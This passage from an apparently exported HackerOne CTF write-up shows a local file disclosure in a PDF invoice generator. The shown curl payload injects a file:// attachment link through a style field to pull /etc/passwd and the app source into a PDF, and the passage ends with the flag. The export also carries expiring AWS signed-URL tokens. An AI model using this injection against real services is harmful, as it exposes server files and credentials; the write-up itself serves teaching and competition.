passwd\n\nroot@pwnbox16:~/files/pdfhack# cat passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like we have a full LFD :)\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s try leaking the source code of webapp. Judging from the previous docker instance, the source should be in \u003ccode\u003e/app/main.py\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 \u0026#39;http://172.19.0.3/invoices/pdfize?d={\u0026quot;companyName\u0026quot;:\u0026quot;Acme Tools\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;accounting@acme.com\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;0001\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;2019-04-01\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-color:white}\u0026lt;/sty\u0026lt;/stystylele\u0026gt;le\u0026gt;\u0026lt;link rel=\\\u0026quot;attachment\\\u0026quot; href=\\\u0026quot;file:///app/main.py\\\u0026quot;\u0026gt;\u0026quot;:\u0026quot;white\u0026quot;}}}\u0026#39;  -o out2.pdf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 20846  100 20846    0     0  46844      0 --:--:-- --:--:-- --:--:-- 46739\n\nroot@pwnbox16:~/files/pdfhack# pdftk out2.pdf unpack_files\nroot@pwnbox16:~/files/pdfhack# cat main.py\n\u0026quot;\u0026quot;\u0026quot;\nCONGRATULATIONS!\n\nIf you\u0026#39;re reading this, you\u0026#39;ve made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include \u0026#39;c8889970d9fb722066f31e804e351993\u0026#39; in the report, so we know for sure you made it through!\n\nCongratulations again, and I\u0026#39;m sorry for the red herrings. :)\n\u0026quot;\u0026quot;\u0026quot;\n\nfrom flask import Flask, abort, redirect, render_template, request, Response\nfrom jinja2 import Template\nfrom weasyprint import HTML\nimport base64, json, os, random, re\n\napp = Flask(__name__)\n\u0026lt;snip\u0026gt;...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking at the rest of the source, I realized I dodged a fuckin bulldozer by not messing with the login...\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/auth\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emethods\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eauth\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003emethod\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eform\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003emakeSqlError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e \u003cspan class=\"ow\"\u003eis\u003c/span\u003e \u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;sqlmap\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;User-Agent\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003erandom\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erandrange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eraise\u003c/span\u003e \u003cspan class=\"nb\"\u003eException\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;SQL Error\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003erender\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;login\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epage\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;login\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emakeSqlError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003equotes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eescape\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\n    \u003cspan class=\"n\"\u003enonquoted\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eescape\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eescape\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eescape\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003equotes\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003equotes\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003enonquoted\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003equotes\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"bp\"\u003eFalse\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39; OR \u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003enonquoted\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Invalid password\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;UNION\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003enonquoted\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Invalid username\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Invalid username or password\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTHAT IS SO EVIL. I definitely wouldn\u0026#39;t have enjoyed going down that rabbit hole...\u003c/p\u003e\n\n\u003cp\u003eSo getting the source of \u003ccode\u003emain.py\u003c/code\u003e marked the end of the CTF. The flag is \u003ccode\u003ec8889970d9fb722066f31e804e351993\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eOverall, it was pretty good except the advanced guessing parts. This was a team effort by me and \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eCyber quantum blockchain RCE with AI\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":434370,"file_name":"s1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/370/52a22ae26315968b5f59c54f462606054f834b83/s1.png?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=f8112669b17995909abafc08ad05031b79182fc0bb9d4ae0d6b9acab8efb0e21","file_size":371815,"type":"image/png"},{"id":434392,"file_name":"Selection_200.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/392/038135f9aecbeaf6528a2cfe3bd35ce13f9a7d6c/Selection_200.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_200.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_200.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=36e90980423ef156682f1950158a7ad8abe6359feb849e73538fafd3c35350cc","file_size":68663,"type":"image/png"},{"id":434393,"file_name":"Selection_201.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/393/8cef772df6a7392eeefbe579ed73c7f55adc4c62/Selection_201.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_201.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_201.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=8f2ccdfccd0910e55c9ad79bd0dacc4a68203270a0332e96cf957eebf462b1f1","file_size":126862,"type":"image/png"},{"id":434420,"file_name":"Selection_202.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/420/bc609ad76fcec9c219c5f7f94422a3a3fc5fa764/Selection_202.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_202.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_202.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=8d4724efc003e6cef32eaf7aeebefbbc58a2b45c2a6245fb05a13cd087cd8000","file_size":95118,"type":"image/png"},{"id":434443,"file_name":"Selection_203.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/443/175464f5da895a913802bd9018cb5f87ece64fdd/Selection_203.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_203.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_203.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2Fq